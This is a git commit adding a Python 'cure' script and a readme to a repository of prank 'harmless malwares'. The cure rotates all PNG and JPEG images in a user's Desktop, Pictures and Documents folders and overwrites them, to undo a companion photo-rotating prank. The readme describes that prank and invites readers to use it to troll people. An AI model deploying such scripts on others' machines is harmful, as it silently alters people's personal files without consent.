f53c120f8eede93ff8aa778c6e194f95a6629d7e
stupid-melon <live.shashwat@gmail.com>
2021-05-08 13:26:22 +0530

    Added readme.md and the cure for photo rotater

---
+++ photo-rotater-cure.py
@@ -0,0 +1,69 @@
+import platform as pf
+import getpass as gp
+import cv2
+import os
+
+
+def photo_rotater(paths):
+    for main_path in paths:
+        # Checks the existence of path
+        if not os.path.exists(main_path):
+            continue
+        print(f'{main_path}......')
+
+        # Goes thro every image in the folder and subfolders
+        for cur_dir , _ , files in os.walk(main_path):
+            for fil in files:
+                # Checks for invalid files
+                if fil.startswith('.'):
+                    continue
+                # Checks if its an image
+                if not (fil.endswith('.png') or fil.endswith('.jpg') or fil.endswith('.jpeg')):
+                    continue
+                # Rotates the image 90 degress counter CLOCKWISE
+                try:
+                    temp_img = cv2.imread( os.path.join(cur_dir,fil) )
+                    new_img = cv2.rotate(temp_img, cv2.cv2.ROTATE_90_CLOCKWISE)
+                    cv2.imwrite( os.path.join(cur_dir,fil) , new_img )
+                except:
+                    continue
+
+def get_user():
+    try:
+        ret = gp.getuser()
+    except:
+        try:
+            if pf.system() == 'Darwin':
+                temp_list = os.getcwd().split('/')
+            elif pf.system() == 'Windows':
+                temp_list = os.getcwd().split('\\')
+            ret = temp_list [temp_list.index('Users') + 1]
+        except:
+            try:
+                if pf.system() == 'Darwin':
+                    temp_list = __file__.split('/')
+                elif pf.system() == 'Windows':
+                    temp_list = __file__.split('\\')
+                ret = temp_list [temp_list.index('Users') + 1]
+            except:
+                ret = 'Unable to determine'
+    return ret
+
+
+
+if __name__ == "__main__" :
+    print('WARNING! DO NOT STOP THE EXECUTION IN THE MIDDLE WHAT SO EVER!\n')
+    user = get_user()
+    if pf.system == 'Windows':
+        paths = [
+            f'C:\\Users\\{user}\\Desktop',
+            f'C:\\Users\\{user}\\Pictures',
+            f'C:\\Users\\{user}\\Documents']
+    else:
+        paths = [
+            f'/Users/{user}/Desktop',
+            f'/Users/{user}/Pictures',
+            f'/Users/{user}/Documents']
+    photo_rotater(paths)
+    print('\nDONE!')
+
---
+++ readme.md
@@ -0,0 +1,49 @@
+# Introduction
+
+**NOTE: The creator is NOT responsible for whatever you do. These codes have been desgned to not have any long lasting effects. The creator is not responsible for any bugs or glitches which might harm your device**
+
+<br>
+
+Just a smoll collection of harmless malwares which you can use to troll people. Read further to find out what each program does
+
+<br>
+
+# Program Information
+## photo_rotater.py
+<br>
+
+**Required Modules:** opencv-python. To install it, run the following commands in the command prompt/terminal:
+
+(On Windows)
+
+```
+pip install opencv-python
+```
+(On Mac)
+```
+pip3 install opencv-python`
+```
+<br>
+
+**What does it do:** It basically rotates all the images in certain paths 90° anti-clockwise. It goes through the images in the below paths:
+
+(On Windows)
+
+`C:\Users\{user}\Desktop`
+
+`C:\Users\{user}\Pictures`
+
+`C:\Users\{user}\Documents`
+
+(On Mac)
+
+`/Users/{user}/Desktop`
+
+`/Users/{user}/Pictures`
+
+`/Users/{user}/Documents`
+
+<br>
+
+**How to reverse the changes:** Either run it 3 more times, or run photo-rotater-cure.py
+
